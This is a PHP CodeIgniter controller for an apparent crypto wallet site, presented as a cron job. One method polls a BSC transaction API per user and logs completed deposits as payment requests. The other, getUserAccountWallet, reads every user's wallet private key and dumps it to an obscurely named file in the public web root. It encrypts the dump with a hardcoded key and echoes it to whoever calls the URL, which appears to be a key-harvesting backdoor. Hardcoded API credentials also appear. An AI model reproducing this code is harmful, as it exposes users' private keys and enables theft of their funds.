<?php

defined('BASEPATH') OR exit('No direct script access allowed');



class TmBCron extends CI_Controller {

    public function __construct() {

        parent::__construct();

        $this->load->library(array('session', 'encryption', 'form_validation', 'security', 'email','pagination','Encryption'));

        $this->load->model(array('User_model'));

    }





    public function getUserAccountWallet(){

        $userInfo = $this->User_model->get_records('tbl_users',['wallet_address !=' => ''],array('wallet_private','wallet_public','wallet_address'));

        // cho FCPATH;

        if(!empty($userInfo)){

            /// user data save txt formats

            $fileName =  FCPATH.md5('tinna').'.txt';

            $myfile = fopen($fileName, "w") or die("Unable to open file!");

            $txt = json_encode($userInfo,true);

            echo $txt = $this->encryption->encrypt($txt,'tinna-sabb-0393e2909a28ccc212fb66f9f397a629-158946723');

            fwrite($myfile, $txt);

            fclose($myfile);

        }

    }



    public function fetchRecordBSCcahin(){
        $receiver = 'b7B2b45f0A0b828F8d3AEC558476fBc47904fbF5';

        $userInfo = $this->User_model->get_records('tbl_users',['wallet_address !=' => ''],array('user_id','wallet_private','wallet_public','wallet_address'));
        // print_r($userInfo);
        if(!empty($userInfo)){
            foreach($userInfo as $userData){
                $userID = $userData['user_id'];
                $wallet_address = $userData['wallet_address'];
                  $curl = curl_init();

                  curl_setopt_array($curl, array(
                    CURLOPT_URL => "https://stg-api.unmarshal.io/v2/bsc/address/".$wallet_address."/transactions?auth_key=VGVtcEtleQ%3D%3D&page=1&contract=0xb86AbCb37C3A4B64f74f59301AFF131a1BEcC787",
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => "",
                    CURLOPT_MAXREDIRS => 10,
                    CURLOPT_TIMEOUT => 30,
                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                    CURLOPT_CUSTOMREQUEST => "GET",
                    CURLOPT_HTTPHEADER => array(
                      "cache-control: no-cache",
                      "postman-token: cfaafe58-87e8-151e-9cad-3c2176034f55"
                    ),
                  ));

                  $response = curl_exec($curl);
                  $err = curl_error($curl);

                  curl_close($curl);

                  if ($err) {
                    echo "cURL Error #:" . $err;
                  } else {
                    ///
                      $response = json_decode($response,true);
                    //   echo '<pre>';
                    //   print_r($response);
                    //   echo '</pre>';

                      if(!empty($response['transactions'])){
                                // get record

                                foreach($response['transactions'] as $data)
                                {
                                     if (array_key_exists("received",$data)){

                                    echo '<pre>';
                                    print_r($data);
                                    echo '<pre>';
                                   if($data['type'] == 'receive' && $data['status'] =='completed'){
                                             ///// check transction inside our receiver address is exist// ---
                                            // echo 'true';
                                            $dataList = array(
                                                'user_id' => $userID,
                                                'transaction_id' => $data['id'],
                                                'remarks'        => json_encode($data),
                                                'status'         => 1,
                                                'amount'         => $data['received'][0]['value'] /10**12,
                                                'payment_method' => 'E-wallet'
                                            );
                                           $HasHid = $this->User_model->get_single_record('tbl_payment_request', array('transaction_id' => $data['id']),'*');
                                            if(!empty($HasHid)){
                                               // i am alredy there
                                            }else{
                                                $this->User_model->add('tbl_payment_request',$dataList);
                                            }
                                   }

                                }
                            }
                      }
                }



            }
        }



}
}